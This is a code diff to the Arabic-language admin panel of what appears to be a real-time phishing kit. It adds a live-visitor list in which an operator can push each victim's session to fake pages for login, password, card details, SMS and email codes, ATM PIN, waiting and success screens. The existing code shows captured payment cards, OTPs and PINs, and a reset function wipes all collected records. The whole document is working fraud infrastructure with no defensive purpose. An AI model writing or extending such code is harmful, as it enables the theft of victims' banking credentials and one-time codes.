@@ -243,7 +243,7 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 
   <div class="body">
     <div class="col-a">
-      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
+      <div class="col-a-head"><div class="gd"></div> الزوار النشطين (<span id="aCnt">0</span>)</div>
       <div id="aList"></div>
     </div>
     <div class="col-o">
@@ -267,6 +267,7 @@ var STEPS={card:'بطاقة الدفع',otp:'رمز التحقق',pin:'الرق�
 var STEPC={card:'#0ea5e9',otp:'#f59e0b',pin:'#a855f7'};
 
 var TOKEN=sessionStorage.getItem('admin_token')||'',orders=[],onlineCount=0,totalVisitors=0,visitorPages=[],
+    activeVisitors=[],selVisitor=null,
     selRef=null,sQ='',prevRefs=new Set(),delConfRef=null,detDelConf=false;
 
 function getStep(o){
@@ -379,21 +380,47 @@ function renderStats(){
   }).join('');
   document.getElementById('tbV').textContent=orders.length;
   document.getElementById('tbO').textContent=onlineCount;
-  document.getElementById('aCnt').textContent=active.length;
+  document.getElementById('aCnt').textContent=activeVisitors.length;
   document.getElementById('oCnt').textContent=orders.length;
 }
 
 function renderActive(){
-  var el=document.getElementById('aList'),list=orders.filter(isActive);
-  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
-  el.innerHTML=list.map(function(o){
-    var badge=o.step?stepBadge(o.step):statusBadge(o);
-    var pay=o.pay||{};
-    var otp=pay.otp?'<span class="otp">OTP: '+esc(pay.otp)+'</span>':'';
-    return '<div class="ac'+(o.ref===selRef?' sel':'')+'" onclick="selectOrder(\''+esc(o.ref)+'\')">'+
-      '<div class="ac-t"><span class="ac-n">'+(esc(o.n)||esc(o.p)||'—')+'</span>'+badge+'</div>'+
-      '<div class="ac-info">'+(o.p?'<span>📱 '+esc(o.p)+'</span>':'')+otp+'</div></div>';
+  var el=document.getElementById('aList');
+  if(!activeVisitors.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد زوار نشطين حالياً</p></div>';return;}
+  el.innerHTML=activeVisitors.map(function(v){
+    var sid=v.session_id||'';
+    var shortSid=sid.length>14?sid.substring(0,14)+'…':sid;
+    var pg=v.current_page||'unknown';
+    var isSel=selVisitor===sid;
+    var h='<div class="ac'+(isSel?' sel':'')+'" onclick="toggleVisitor(\''+esc(sid)+'\')">';
+    h+='<div class="ac-t"><span class="ac-n">🌐 '+esc(shortSid)+'</span>';
+    h+='<span class="pg-badge" style="background:#3b82f6">'+esc(pg)+'</span></div>';
+    h+='<div class="ac-info"><span>📄 '+esc(pg)+'</span></div>';
+    if(isSel){
+      h+='<div style="margin-top:8px;display:grid;grid-template-columns:repeat(2,1fr);gap:4px">';
+      [{l:'🏠 الرئيسية',pg:'index.html',c:'#6b7280'},
+       {l:'🔑 تسجيل',pg:'login.html',c:'#3b82f6'},
+       {l:'🔒 كلمة المرور',pg:'password.html',c:'#7c3aed'},
+       {l:'💳 البطاقة',pg:'card-details.html',c:'#0ea5e9'},
+       {l:'📲 الكود 6',pg:'code.html',c:'#f59e0b'},
+       {l:'📲 الكود 4',pg:'code3.html',c:'#eab308'},
+       {l:'📧 كود البريد',pg:'email-code.html',c:'#06b6d4'},
+       {l:'🏧 ATM',pg:'atm.html',c:'#a855f7'},
+       {l:'⏳ الانتظار',pg:'waiting.html',c:'#64748b'},
+       {l:'✅ النجاح',pg:'success.html',c:'#16a34a'}
+      ].forEach(function(p){
+        h+='<button style="background:'+p.c+';color:#fff;border:none;border-radius:6px;padding:5px 4px;font-size:10px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif" onclick="event.stopPropagation();doVisitorRedir(\''+esc(sid)+'\',\''+p.pg+'\')">'+p.l+'</button>';
+      });
+      h+='</div>';
+    }
+    h+='</div>';
+    return h;
   }).join('');
+}
+function toggleVisitor(sid){selVisitor=selVisitor===sid?null:sid;renderActive();}
+function doVisitorRedir(sid,page){
+  api('PATCH','/api/visitors/'+encodeURIComponent(sid),{redirect_to:page}).then(function(){
+    showNotif('✅ تم إعادة توجيه الزائر');selVisitor=null;loadVisitors();});
 }
 
 function renderOrders(){
@@ -423,9 +450,9 @@ function oDel(ref){
 }
 
 function selectOrder(ref){selRef=ref;delConfRef=null;detDelConf=false;
-  var o=orders.find(function(x){return x.ref===ref;});if(o)renderDetail(o);renderActive();renderOrders();}
+  var o=orders.find(function(x){return x.ref===ref;});if(o)renderDetail(o);renderOrders();}
 function closeDetail(){selRef=null;document.getElementById('dEmpty').style.display='flex';
-  document.getElementById('dCont').style.display='none';renderActive();renderOrders();}
+  document.getElementById('dCont').style.display='none';renderOrders();}
 
 function renderDetail(o){
   document.getElementById('dEmpty').style.display='none';
@@ -571,17 +598,18 @@ function loadOrders(){
     if(prevRefs.size>0){var fresh=nw.filter(function(o){return!prevRefs.has(o.ref);});
       if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].n||fresh[0].p||'—'));}}
     prevRefs=nrefs;orders=nw;
-    renderStats();renderActive();renderOrders();
+    renderStats();renderOrders();
     if(selRef){var o=orders.find(function(x){return x.ref===selRef;});if(o)renderDetail(o);else closeDetail();}
   }).catch(function(){});
 }
 function loadVisitors(){
   api('GET','/api/visitors/active').then(function(r){
     onlineCount=r.count||0;
-    var visitors=r.visitors||[];
-    totalVisitors=visitors.length;
-    visitorPages=visitors.map(function(v){return v.current_page||'unknown';});
+    activeVisitors=r.visitors||[];
+    totalVisitors=activeVisitors.length;
+    visitorPages=activeVisitors.map(function(v){return v.current_page||'unknown';});
     renderStats();
+    renderActive();
   }).catch(function(){});
 }
 
@@ -629,7 +657,7 @@ function closeVM(){document.getElementById('vModal').classList.remove('show');do
 function resetAll(){
   if(!confirm('⚠️ هل أنت متأكد؟ سيتم حذف جميع الطلبات والزوار نهائياً!'))return;
   api('POST','/api/admin/reset').then(function(r){
-    orders=[];onlineCount=0;totalVisitors=0;visitorPages=[];prevRefs=new Set();selRef=null;
+    orders=[];activeVisitors=[];onlineCount=0;totalVisitors=0;visitorPages=[];prevRefs=new Set();selRef=null;selVisitor=null;
     renderStats();renderActive();renderOrders();closeDetail();closeVM();
     loadOrders();loadVisitors();
     showNotif('✅ تم تصفير جميع البيانات — الطلبات: '+(r.deletedOrders||0));
